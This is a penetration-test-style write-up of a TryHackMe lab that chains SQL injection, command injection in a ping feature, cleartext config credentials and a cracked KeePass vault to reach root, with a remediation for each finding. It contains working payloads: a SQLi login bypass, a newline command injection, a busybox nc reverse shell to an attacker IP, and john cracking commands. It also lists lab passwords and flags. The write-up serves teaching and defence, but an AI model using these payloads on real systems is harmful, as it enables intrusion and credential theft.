r README · MD
# Silent Monitor — Penetration Test Report
 
> **Room:** Silent Monitor · *"Green Lights, Dark Corners"* (CorpNet NOC)
> **Assessor:** Jack · **Date:** 2026-11-06 · **Classification:** Confidential
 
![status](https://img.shields.io/badge/status-complete-brightgreen) ![flags](https://img.shields.io/badge/flags-2%2F2-blue) ![difficulty](https://img.shields.io/badge/type-web%20%E2%86%92%20root-informational)
 
> [!NOTE]
> This is a TryHackMe lab. Target and attacker IP addresses change between sessions; commands below show the IP active at the time of each step.
 
---
 
## Table of Contents
- [1. Executive Summary](#1-executive-summary)
- [2. Scope & Methodology](#2-scope--methodology)
- [3. Reconnaissance](#3-reconnaissance)
- [4. Findings](#4-findings)
  - [Finding 1 — SQL Injection Auth Bypass](#finding-1--sql-injection-authentication-bypass-critical)
  - [Finding 2 — OS Command Injection](#finding-2--os-command-injection-via-health-check-critical)
  - [Finding 3 — Hardcoded Credentials in Config](#finding-3--hardcoded-credentials-in-application-config-high)
  - [Finding 4 — Weak Vault Master Password](#finding-4--weak-master-password-on-credential-vault-high)
  - [Finding 5 — Reusable Root Password in Backup](#finding-5--reusable-plaintext-root-password-in-vault-high)
- [5. Attack Path](#5-attack-path)
- [6. Flags Captured](#6-flags-captured)
- [7. Remediation Priorities](#7-remediation-priorities)
- [8. Cleanup Notes](#8-cleanup--post-engagement-notes)
---
 
## 1. Executive Summary
 
The CorpNet NOC portal was assessed as an unauthenticated attacker. Full host compromise (**root**) was achieved by chaining a SQL injection authentication bypass, an OS command injection in a "health check" feature, credential disclosure in an application config file, and a weakly-protected KeePass credential vault.
 
**Attack path:**
> SQLi auth bypass → OS command injection (shell as www-data) → config-file credential disclosure → lateral move to `sysadmin` → cracked KeePass vault → root password → **root**
 
The unifying root cause is **secrets stored insecurely and trust placed in unvalidated input**: the login query was string-built, the health-check command was passed to a shell with an incomplete filter, and privileged credentials sat in a config file and in a vault protected by a dictionary-weak master password.
 
### Severity Summary
| # | Finding | Severity |
|---|---------|:--------:|
| 1 | SQL injection authentication bypass | 🔴 Critical |
| 2 | OS command injection via health check | 🔴 Critical |
| 3 | Hardcoded credentials in application config | 🟠 High |
| 4 | Weak master password on credential vault | 🟠 High |
| 5 | Reusable plaintext root password in backup | 🟠 High |
 
---
 
## 2. Scope & Methodology
 
**In scope:** the CorpNet NOC host (TCP 22, 5050) and the Flask/Werkzeug web app it serves. Objectives: `user.txt`, `root.txt`.
 
**Methodology:** black-box — recon → enumeration → exploitation → post-exploitation → privilege escalation (PTES/OWASP-aligned). Findings are in discovery order, which mirrors the exploitation chain.
 
**Tooling:** `nmap`, `gobuster`, Burp Suite, `busybox nc`, `python3`, `keepass2john`, `john`, `keepassxc-cli`.
 
---
 
## 3. Reconnaissance
 
```bash
nmap -sC -sV -p- <target>
```
| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 8.9p1 (Ubuntu) |
| 5050/tcp | HTTP — Werkzeug 2.0.2 (Python 3.10.12) |
 
```bash
gobuster dir -u http://<target>:5050 -w .../directory-list-2.3-medium.txt -x php,html,js,txt
# /internal  (200)
```
`/internal` served a login form — the single entry point. The Python/Werkzeug stack is noted: Python is guaranteed present for later payloads.
 
---
 
## 4. Findings
 
### Finding 1 — SQL Injection Authentication Bypass (Critical)
 
**Description.** The `/internal` login built its query by string interpolation with no parameterisation. A boolean payload bypassed authentication.
 
**Evidence.**
```
username: admin' OR 1=1 --
password: (any)
```
Access was granted to the dashboard, which exposed Host Health, Audit Log, and Services functions, plus internal usernames (`jmartin`, `svc-mon`, `netops`). Source review (recovered later) confirmed:
```python
query = ("SELECT id, username, role FROM users "
         "WHERE username = '%s' AND password = '%s'") % (username, pw_hash)
```
 
**Impact.** Full authentication bypass to the internal console.
 
**Remediation.** Use parameterised queries / prepared statements. Do not rely on keyword blocklists.
 
---
 
### Finding 2 — OS Command Injection via Health Check (Critical)
 
**Description.** The "Host Health" feature passed a user-supplied target into a shell command (`ping -c 2 -W 1 <target>`) built by concatenation with `shell=True`. A character blocklist attempted to prevent injection but was bypassable via the raw HTTP request.
 
**Evidence.** Source (confirmed post-exploitation):
```python
PING_BLOCK_RE = re.compile(r"[;|`$&]")
proc = subprocess.Popen("ping -c 2 -W 1 " + target, shell=True, ...)
```
The browser form re-encoded input, defeating naive attempts; submitting directly through **Burp Suite** bypassed the client-side handling. A newline-separated payload injected a second command:
```
target=10.130.84.210
id
→ uid=33(www-data) gid=33(www-data)
```
 
<details>
<summary><b>Exploitation — reverse shell (click to expand)</b></summary>
With a listener running (`nc -lvnp 4444`), the following was submitted via Burp. The `busybox nc` variant was used because modern Linux ships netcat without `-e`; BusyBox's `nc` retains it:
```
target=10.129.99.103
busybox nc 10.129.99.103 4444 -e /bin/bash
```
Shell returned as `www-data`, then stabilised:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z ; stty raw -echo ; fg ; (Enter x2) ; export TERM=xterm
```
</details>
**Impact.** Remote code execution as the web service account.
 
**Remediation.** Never build shell commands from user input. Use an argument array with `shell=False` and validate the target against a strict allow-list. Blocklists are defence-in-depth only.
 
---
 
### Finding 3 — Hardcoded Credentials in Application Config (High)
 
**Description.** The app directory `/opt/netops` held a config file readable by `www-data` storing a service-account password in cleartext.
 
**Evidence.**
```ini
[backup_agent]
run_as   = sysadmin
password = S3cur3Backup$Acc3ss!
```
 
**Exploitation — lateral movement.** The password authenticated `sysadmin` over SSH, yielding the user flag:
```bash
ssh sysadmin@<target>    # S3cur3Backup$Acc3ss!
```
> [!IMPORTANT]
> **user.txt:** `THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}`
 
**Impact.** Transition from the web service account to an interactive user.
 
**Remediation.** Remove secrets from on-disk config; use a secrets manager with least-privilege permissions. Rotate the exposed credential.
 
---
 
### Finding 4 — Weak Master Password on Credential Vault (High)
 
**Description.** `sysadmin`'s home held a KeePass database exported by a "backup agent," protected only by a dictionary-crackable master password.
 
**Evidence.**
```bash
ls -la /home/sysadmin/backups/      # README.txt  infrastructure.kdbx  (no keyfile)
keepass2john infrastructure.kdbx > kdbx.hash
john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash
john --show kdbx.hash
# infrastructure:spring
```
Master password: **`spring`**.
 
**Impact.** Full disclosure of the vault contents (see Finding 5).
 
**Remediation.** Protect vaults with a strong master password **and** a keyfile. Do not store `.kdbx` exports where service/user accounts can read them.
 
---
 
### Finding 5 — Reusable Plaintext Root Password in Vault (High)
 
**Description.** The vault held the host's root password in cleartext, with a note confirming it was a known-temporary credential.
 
**Evidence.**
```bash
keepassxc-cli open infrastructure.kdbx     # password: spring
backup> show -s "Root User Password - Sensitive"
```
```
UserName: root
Password: S3cur3P4ss0nK33p4ss
Notes:    root user password, remember to change later.
```
 
**Exploitation — root.** Direct root SSH login was disabled (`PermitRootLogin`), but the existing `sysadmin` shell allowed a local `su`:
```bash
su root        # S3cur3P4ss0nK33p4ss
id             # uid=0(root)
cat /root/root.txt
```
> [!IMPORTANT]
> **root.txt:** `THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}`
 
**Impact.** Full root compromise.
 
**Remediation.** Never store the live root password in a backup accessible to lower-privileged accounts; rotate immediately; enforce that "temporary" credentials are changed before deployment.
 
---
 
## 5. Attack Path
 
```
Login form (/internal)
   │  SQLi:  admin' OR 1=1 --
   ▼
Authenticated dashboard
   │  Command injection in Host Health (Burp, newline bypass)
   ▼
Reverse shell as www-data  (busybox nc -e)
   │  read /opt/netops/secret.config
   ▼
sysadmin  (SSH, reused backup_agent password)  ──►  user.txt
   │  loot /home/sysadmin/backups/infrastructure.kdbx
   │  keepass2john → john (rockyou) → master "spring"
   ▼
Vault: root password "S3cur3P4ss0nK33p4ss"
   │  su root  (SSH root login disabled)
   ▼
root  ──►  root.txt
```
 
---
 
## 6. Flags Captured
 
| Objective | Flag |
|-----------|------|
| user.txt | `THM{sQli_4nd_cMd_1nj3ct10n_l3D_y0u_h3re!}` |
| root.txt | `THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}` |
 
---
 
## 7. Remediation Priorities
 
1. **Parameterise all SQL** (Finding 1) — removes the auth bypass at the entry point.
2. **Eliminate shell command construction from user input** (Finding 2) — `shell=False` + argument array + allow-list.
3. **Remove secrets from disk** (Findings 3, 5) — secrets manager, least privilege, rotate all exposed credentials.
4. **Harden the credential vault** (Finding 4) — strong master password + keyfile; restrict backup access.
5. **Enforce credential hygiene** — no temporary or reused passwords reaching production.
---
 
## 8. Cleanup / Post-Engagement Notes
 
In a real engagement, remove the reverse-shell process and any exfiltrated `infrastructure.kdbx` copy from the attacker host, and report both. All observed credentials (`S3cur3Backup$Acc3ss!`, the KeePass master `spring`, root `S3cur3P4ss0nK33p4ss`) must be considered compromised and rotated.
 
---
 
<sub><i>Educational lab writeup — all testing performed in an authorised TryHackMe environment.</i></sub>
